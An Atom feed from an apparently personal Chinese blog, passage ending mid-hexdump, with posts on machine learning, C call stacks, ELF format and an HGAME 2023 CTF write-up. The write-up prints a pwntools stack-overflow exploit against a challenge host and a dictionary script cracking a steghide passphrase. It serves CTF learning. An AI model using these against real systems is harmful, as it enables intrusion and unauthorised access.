<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ANTIHYPEzero</title>
  
  <subtitle>你好！</subtitle>
  <link href="http://antihypezero.github.io/atom.xml" rel="self"/>
  
  <link href="http://antihypezero.github.io/"/>
  <updated>2023-01-13T02:03:12.655Z</updated>
  <id>http://antihypezero.github.io/</id>
  
  <author>
    <name>Antihype</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>机器学习</title>
    <link href="http://antihypezero.github.io/2023/01/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>http://antihypezero.github.io/2023/01/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-01-08T14:53:06.745Z</published>
    <updated>2023-01-13T02:03:12.655Z</updated>
    
    <content type="html"><![CDATA[<h2 id="监督学习"><a href="#监督学习" class="headerlink" title="监督学习"></a>监督学习</h2><p><strong>标签，是连续值还是离散值，将监督学习问题分为分类问题和回归问题，其中分类问题的标签是离散值，回归问题的标签是连续值</strong>。</p><p>example:</p><p><a href="https://imgse.com/i/pSVoOWq"><img src="https://s1.ax1x.com/2023/01/08/pSVoOWq.png" alt="pSVoOWq.png" style="zoom: 50%;" /></a></p><p><a href="https://imgse.com/i/pSVovlV"><img src="https://s1.ax1x.com/2023/01/08/pSVovlV.png" alt="pSVovlV.png" style="zoom: 50%;" /></a></p><h2 id="非监督学习"><a href="#非监督学习" class="headerlink" title="非监督学习"></a>非监督学习</h2><p><strong>无监督学习是一种机器学习的训练方式，它本质上是一个统计手段，在没有标签的数据里可以发现潜在的一些结构的一种训练方式。</strong></p><p><a href="https://imgse.com/i/pSVHHTe"><img src="https://s1.ax1x.com/2023/01/08/pSVHHTe.png" alt="pSVHHTe.png" style="zoom:50%;" /></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;监督学习&quot;&gt;&lt;a href=&quot;#监督学习&quot; class=&quot;headerlink&quot; title=&quot;监督学习&quot;&gt;&lt;/a&gt;监督学习&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;标签，是连续值还是离散值，将监督学习问题分为分类问题和回归问题，其中分类问题的标签是离散值，回归问题的标签是</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HGAME 2023</title>
    <link href="http://antihypezero.github.io/2023/01/05/HGAME-2023/"/>
    <id>http://antihypezero.github.io/2023/01/05/HGAME-2023/</id>
    <published>2023-01-05T14:04:04.045Z</published>
    <updated>2023-01-06T16:14:18.883Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h3><p>直接nc</p><p><img src="https://s1.ax1x.com/2023/01/06/pSEmC2q.png" alt="pSEmC2q.png"></p><h3 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h3><p>最基础的栈溢出题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;61.147.171.105&#x27;</span>, <span class="number">60099</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span> + p64(<span class="number">0x400176</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h3><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Sign-In"><a href="#Sign-In" class="headerlink" title="Sign In"></a>Sign In</h3><p>直接在线解码</p><p><a href="https://imgse.com/i/pSEugvq"><img src="https://s1.ax1x.com/2023/01/06/pSEugvq.png" alt="pSEugvq.png"></a></p><h3 id="神秘的海报"><a href="#神秘的海报" class="headerlink" title="神秘的海报"></a>神秘的海报</h3><p>看到png文件，用zsteg</p><p><a href="https://imgse.com/i/pSE0wNj"><img src="https://s1.ax1x.com/2023/01/06/pSE0wNj.png" alt="pSE0wNj.png"></a></p><p>得到了前一部分，后面是网址，点开下载得到一个wav音频文件</p><p>我们可以使用steghide获取密文，首先获取密码，采用爆破的形式</p><p>代码如下：<del>我是一个搬运工</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    stegoFile = <span class="string">&#x27;Bossanova.wav&#x27;</span> <span class="comment">#待破解文件</span></span><br><span class="line">    extractFile = <span class="string">&#x27;passwd.txt&#x27;</span> <span class="comment">#输出密文</span></span><br><span class="line">    passFile = <span class="string">&#x27;english.dic&#x27;</span> <span class="comment">#字典，我用的是Elcomsoft Password Recovery里的english.dic</span></span><br><span class="line"></span><br><span class="line">    errors = [<span class="string">&#x27;could not extract&#x27;</span>, <span class="string">&#x27;steghide --help&#x27;</span>, <span class="string">&#x27;Syntax error&#x27;</span>]</span><br><span class="line">    cmdFormat = <span class="string">&#x27;steghide extract -sf &quot;%s&quot; -xf &quot;%s&quot; -p &quot;%s&quot;&#x27;</span></span><br><span class="line">    f = <span class="built_in">open</span>(passFile, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        cmd = cmdFormat % (stegoFile, extractFile, line.strip())</span><br><span class="line">        p = Popen(cmd, shell=<span class="literal">True</span>, stdout=PIPE, stderr=STDOUT)</span><br><span class="line">        content = <span class="built_in">str</span>(p.stdout.read(), <span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> err <span class="keyword">in</span> errors:</span><br><span class="line">            <span class="keyword">if</span> err <span class="keyword">in</span> content:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(content),</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;the passphrase is %s&#x27;</span> % (line.strip()))</span><br><span class="line">            f.close()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    foo()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    foo()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>获得密文：123456 </p><p><a href="https://imgse.com/i/pSEBgzt"><img src="https://s1.ax1x.com/2023/01/06/pSEBgzt.png" alt="pSEBgzt.png"></a></p><p><a href="https://imgse.com/i/pSEBWsf"><img src="https://s1.ax1x.com/2023/01/06/pSEBWsf.png" alt="pSEBWsf.png"></a></p><p>这里是复现，所以存在过了</p><p><a href="https://imgse.com/i/pSEB7Js"><img src="https://s1.ax1x.com/2023/01/06/pSEB7Js.png" alt="pSEB7Js.png"></a></p><p>两者拼接，即得flag</p><h3 id="e99p1ant-wan"><a href="#e99p1ant-wan" class="headerlink" title="e99p1ant_wan"></a>e99p1ant_wan</h3><p>根据提示，使用CRC检验，得出正确的长和宽，在010Editor里修改即得flag</p><p>脚本如下：    <del>我是一个搬运工</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;e.png&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    all_b = f.read()</span><br><span class="line">    crc32key = <span class="built_in">int</span>(all_b[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">    data = <span class="built_in">bytearray</span>(all_b[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">    n = <span class="number">4095</span>  </span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):  </span><br><span class="line">        width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))  </span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                data[x + <span class="number">4</span>] = width[x]</span><br><span class="line">                data[x + <span class="number">8</span>] = height[x]</span><br><span class="line">            crc32result = zlib.crc32(data)</span><br><span class="line">            <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">print</span>(data.<span class="built_in">hex</span>())</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;宽为：&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(width)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;高为：&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(height)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pSEUnF1"><img src="https://s1.ax1x.com/2023/01/06/pSEUnF1.png" alt="pSEUnF1.png"></a></p><p><a href="https://imgse.com/i/pSEUQSK"><img src="https://s1.ax1x.com/2023/01/06/pSEUQSK.png" alt="pSEUQSK.png"></a></p><p><a href="https://imgse.com/i/pSEU1yD"><img src="https://s1.ax1x.com/2023/01/06/pSEU1yD.png" alt="pSEU1yD.png"></a></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="test-your-IDA"><a href="#test-your-IDA" class="headerlink" title="test your IDA"></a>test your IDA</h3><p>将程序放入IDA中，ctrl+shift+F12，可以看到flag</p><p><a href="https://imgse.com/i/pSErmuV"><img src="https://s1.ax1x.com/2023/01/06/pSErmuV.png" alt="pSErmuV.png"></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WEEK1&quot;&gt;&lt;a href=&quot;#WEEK1&quot; class=&quot;headerlink&quot; title=&quot;WEEK1&quot;&gt;&lt;/a&gt;WEEK1&lt;/h1&gt;&lt;h2 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pwn&quot; class=&quot;headerlink&quot; title=&quot;pwn&quot;&gt;&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>C语言函数调用栈(一)</title>
    <link href="http://antihypezero.github.io/2022/10/07/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88(%E4%B8%80)/"/>
    <id>http://antihypezero.github.io/2022/10/07/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88(%E4%B8%80)/</id>
    <published>2022-10-07T14:44:17.568Z</published>
    <updated>2022-10-07T14:51:56.577Z</updated>
    
    <content type="html"><![CDATA[<p><strong>C语言程序的执行过程可以看作连续的函数调用，一个函数执行结束后，程序要回到该函数指令的下一条指令处继续执行。函数调用过程通常使用堆栈实现，每个用户态进程对应一个调用栈结构。编译器使用堆栈传递函数参数、保存返回地址、临时保存寄存器原有值(即函数调用的上下文)已被恢复以及存储本地局部变量。</strong></p><blockquote><p>本文引用<a href="https://www.cnblogs.com/clover-toeic/p/3755401.html">https://www.cnblogs.com/clover-toeic/p/3755401.html</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;C语言程序的执行过程可以看作连续的函数调用，一个函数执行结束后，程序要回到该函数指令的下一条指令处继续执行。函数调用过程通常使用堆栈实现，每个用户态进程对应一个调用栈结构。编译器使用堆栈传递函数参数、保存返回地址、临时保存寄存器原有值(即函数调用的上下文)已</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ELF文件格式</title>
    <link href="http://antihypezero.github.io/2022/10/05/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"/>
    <id>http://antihypezero.github.io/2022/10/05/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/</id>
    <published>2022-10-05T14:05:36.727Z</published>
    <updated>2022-10-06T13:31:29.359Z</updated>
    
    <content type="html"><![CDATA[<p><strong>ELF（Executable and Linkable Format），“可执行可链接格式”，是UNIX系统实验室（USL）作为应用程序二进制接口（Application Binary Interface，ABI）而开发和发布的，也是Linux的主要可执行文件格式</strong></p><h2 id="ELF文件的类型"><a href="#ELF文件的类型" class="headerlink" title="ELF文件的类型"></a>ELF文件的类型</h2><p><strong>这是一个C语言源代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> global_init_num = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> global_uninit_num;`</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> sum)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> local_static_init_num = <span class="number">2</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> local_static_uninit_num;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> local_init_num = <span class="number">3</span>;</span><br><span class="line"><span class="type">int</span> local_uninit_num;</span><br><span class="line"></span><br><span class="line">print(global_init_num + local_static_init_num + local_init_num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>用下列3条命令进行编译</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc ELF_example.c -o ELF_example.exec</span><br><span class="line">$ gcc -c ELF_example.c -o ELF_example.rel</span><br><span class="line">$ gcc -c -fPIC ELF_example.c -o ELF_example_pic.rel &amp;&amp; gcc -shared ELF_example_pic.rel -o ELF_example.dyn</span><br></pre></td></tr></table></figure><p><strong>得到</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ file ELF_example*</span><br><span class="line"></span><br><span class="line">ELF_example.c:       C source, ASCII text, with CRLF line terminators</span><br><span class="line">ELF_example.dyn:     ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=fda940b7d8d4732a1b1e3cd424682f746b1d62f3, not stripped</span><br><span class="line">ELF_example.exec:    ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=93a183d4f5d52d863028fde8f1ef5b325c9c1c19, for GNU/Linux 3.2.0, not stripped</span><br><span class="line">ELF_example_pic.rel: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped</span><br><span class="line">ELF_example.rel:     ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped</span><br></pre></td></tr></table></figure><p><strong>从file命令的输出可以看到，ELF文件分为三种类型，可执行文件(.exec)、可重定位文件(.rel)和共享目标文件(.dyn):</strong></p><ul><li>可执行文件（executable file）（.out）：经过链接的、可执行的文件，通常也被称为程序。</li><li>可重定位文件（relocatable file）（.o）:由源文件编译而成且尚未链接的目标文件，通常以“.o”作为扩展名。用于与其他目标文件进行链接以构成可执行文件或动态链接库，通常是一段位置独立的代码（Position Independent Code, PIC）。</li><li>共享目标文件（shared object file）（.so）:动态链接库文件。用于在链接过程中与其他动态链接库或可重定位文件一起构建新的目标文件，或者在可执行文件加载时，链接到进程中作为运行代码的一部分。</li></ul><h2 id="ELF文件结构"><a href="#ELF文件结构" class="headerlink" title="ELF文件结构"></a>ELF文件结构</h2><p><strong>在审视一个目标文件时,有两种视角可供选择,一种是链接视角,通过节（Section）来进行划分;另一种是运行视角，通过段（Segment）来进行划分。</strong></p><p><img src="https://s3.bmp.ovh/imgs/2022/10/06/53860036a7225148.png" title="审视目标文件的两种视角"></p><p><strong>从链接视角讲，通常目标文件都会包含代码（ .text）、数据（.data）和 BSS （.bss）三个节。其中代码节用于保存可执行的机器指令，数据节用于保存已初始化的全局变量和局部静态变量，BSS 节则用于保存未初始化的全局变量和局部静态变量。</strong></p><p><strong>将程序指令和程序数据分开存放有许多好处，从安全的角度讲，当程序被加载后，数据和指令分别被映射到两个虚拟区域。由于数据区域对于进程来说是可读写的，而指令区域对于进程来说是只读的，所以这两个虚存区域的权限可以被分别设置成可读写和只读，防止程序的指令被改写和利用。</strong></p><h3 id="ELF文件头"><a href="#ELF文件头" class="headerlink" title="ELF文件头"></a>ELF文件头</h3><p><strong>ELF文件头（ELF header）位于目标文件最开始的位置，包含描述整个文件的一些基本信息，例如ELF文件类型、版本&#x2F;ABI版本、目标机器、程序入口、段表和节表的位置和长度等。值得注意的是文件头部存在魔术字符（7f 45 4c 46 ），即字符串“\177ELF”，当文件被映射到内存时，可以通过搜索该字符确定映射地址，这在跳转内存时非常有用。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -h ELF_example.rel</span><br><span class="line">ELF 头：</span><br><span class="line">  Magic：   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  类别:                              ELF64</span><br><span class="line">  数据:                              2 补码，小端序 (little endian)</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI 版本:                          0</span><br><span class="line">  类型:                              REL (可重定位文件)</span><br><span class="line">  系统架构:                          Advanced Micro Devices X86-64</span><br><span class="line">  版本:                              0x1</span><br><span class="line">  入口点地址：               0x0</span><br><span class="line">  程序头起点：          0 (bytes into file)</span><br><span class="line">  Start of section headers:          1032 (bytes into file)</span><br><span class="line">  标志：             0x0</span><br><span class="line">  Size of this header:               64 (bytes)</span><br><span class="line">  Size of program headers:           0 (bytes)</span><br><span class="line">  Number of program headers:         0</span><br><span class="line">  Size of section headers:           64 (bytes)</span><br><span class="line">  Number of section headers:         14</span><br><span class="line">  Section header string table index: 13</span><br></pre></td></tr></table></figure><p><strong>Elf64_Ehdr结构体如下所示</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">    unsigned char e_ident[EI_NIDENT];  /* Magic number and other info */</span><br><span class="line">    Elf64_Half   e_type;         /* Object file type */</span><br><span class="line">    Elf64_Half   e_machine;       /* Architecture */</span><br><span class="line">    Elf64_Word   e_version;       /* Object file version */</span><br><span class="line">    Elf64_Addr   e_entry;    /* Entry point virtual address */</span><br><span class="line">    Elf64_Off   e_phoff;    /* Program header table file offset */</span><br><span class="line">    Elf64_Off   e_shoff;    /* Section header table file offset */</span><br><span class="line">    Elf64_Word   e_flags;    /* Processor-specific flags */</span><br><span class="line">    Elf64_Half   e_ehsize;       /* ELF header size in bytes */</span><br><span class="line">    Elf64_Half   e_phentsize;     /* Program header table entry size */</span><br><span class="line">    Elf64_Half   e_phnum;    /* Program header table entry count */</span><br><span class="line">    Elf64_Half   e_shentsize;     /* Section header table entry size */</span><br><span class="line">    Elf64_Half   e_shnum;    /* Section header table entry count */</span><br><span class="line">    Elf64_Half   e_shstrndx;      /* Section header string table index */</span><br><span class="line">&#125; Elf64_Ehdr;</span><br></pre></td></tr></table></figure><h3 id="节头表"><a href="#节头表" class="headerlink" title="节头表"></a>节头表</h3><p><strong>一个目标文件中包含许多节，这些节的信息保存在节头表（Section header table）中，表的每一项都是一个Elf64_Shdr结构体(也称为节描述符),记录了节的名字、长度、偏移、读写权限等信息。节头表的位置记录在文件头的e_shoff域中。节头表对于程序运行并不是必须的，因为它与程序内存布局无关，是程序头表的任务，所以常有程序去除节头表，以增加反编译器的分析难度。示例程序的节头表如下所示。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -S ELF_example.rel</span><br><span class="line">There are 14 section headers, starting at offset 0x408:</span><br><span class="line">节头：</span><br><span class="line">  [号] 名称              类型             地址              偏移量</span><br><span class="line">       大小              全体大小          旗标   链接   信息   对齐</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .text             PROGBITS         0000000000000000  00000040</span><br><span class="line">       000000000000005f  0000000000000000  AX       0     0     1</span><br><span class="line">  [ 2] .rela.text        RELA             0000000000000000  000002e8</span><br><span class="line">       0000000000000078  0000000000000018   I      11     1     8</span><br><span class="line">  [ 3] .data             PROGBITS         0000000000000000  000000a0</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     4</span><br><span class="line">  [ 4] .bss              NOBITS           0000000000000000  000000a8</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     4</span><br><span class="line">  [ 5] .rodata           PROGBITS         0000000000000000  000000a8</span><br><span class="line">       0000000000000004  0000000000000000   A       0     0     1</span><br><span class="line">  [ 6] .comment          PROGBITS         0000000000000000  000000ac</span><br><span class="line">       0000000000000027  0000000000000001  MS       0     0     1</span><br><span class="line">  [ 7] .note.GNU-stack   PROGBITS         0000000000000000  000000d3</span><br><span class="line">       0000000000000000  0000000000000000           0     0     1</span><br><span class="line">  [ 8] .note.gnu.pr[...] NOTE             0000000000000000  000000d8</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     8</span><br><span class="line">  [ 9] .eh_frame         PROGBITS         0000000000000000  000000f8</span><br><span class="line">       0000000000000058  0000000000000000   A       0     0     8</span><br><span class="line">  [10] .rela.eh_frame    RELA             0000000000000000  00000360</span><br><span class="line">       0000000000000030  0000000000000018   I      11     9     8</span><br><span class="line">  [11] .symtab           SYMTAB           0000000000000000  00000150</span><br><span class="line">       0000000000000120  0000000000000018          12     7     8</span><br><span class="line">  [12] .strtab           STRTAB           0000000000000000  00000270</span><br><span class="line">       0000000000000075  0000000000000000           0     0     1</span><br><span class="line">  [13] .shstrtab         STRTAB           0000000000000000  00000390</span><br><span class="line">       0000000000000074  0000000000000000           0     0     1</span><br></pre></td></tr></table></figure><p><strong>Elf64_Shdr 结构体如下所示</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Wordsh_name; <span class="comment">/* Section name (string tbl index) */</span>    <span class="comment">// 4 bytes</span></span><br><span class="line">  Elf64_Wordsh_type; <span class="comment">/* Section type */</span>                       </span><br><span class="line">  Elf64_Xwordsh_flags; <span class="comment">/* Section flags */</span>                      <span class="comment">// 8 bytes</span></span><br><span class="line">  Elf64_Addrsh_addr; <span class="comment">/* Section virtual addr at execution */</span>  <span class="comment">// 8 bytes</span></span><br><span class="line">  Elf64_Offsh_offset; <span class="comment">/* Section file offset */</span>                <span class="comment">// 8 bytes</span></span><br><span class="line">  Elf64_Xwordsh_size; <span class="comment">/* Section size in bytes */</span></span><br><span class="line">  Elf64_Wordsh_link; <span class="comment">/* Link to another section */</span></span><br><span class="line">  Elf64_Wordsh_info; <span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf64_Xwordsh_addralign; <span class="comment">/* Section alignment */</span></span><br><span class="line">  Elf64_Xwordsh_entsize; <span class="comment">/* Entry size if section holds table */</span></span><br><span class="line">&#125; Elf64_Shdr;</span><br></pre></td></tr></table></figure><p><strong>下面来看示例程序的.text、.data和.bss节。首先是代码节，其中Contents of section.text部分是.text数据的十六进制形式，总共0x5f个字节，最左边一列是偏移量，中间四列是内容，最右边一列是ASCII码形式。Disassembly of section .text是反汇编的结果。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">0 .text         0000005f  0000000000000000  0000000000000000  00000040  2**0</span><br><span class="line">                 CONTENTS, ALLOC, LOAD, RELOC, READONLY, CODE</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Contents of section .text:</span><br><span class="line"> 0000 f30f1efa 554889e5 4883ec10 897dfc8b  ....UH..H....&#125;..</span><br><span class="line"> 0010 45fc89c6 488d0500 00000048 89c7b800  E...H......H....</span><br><span class="line"> 0020 000000e8 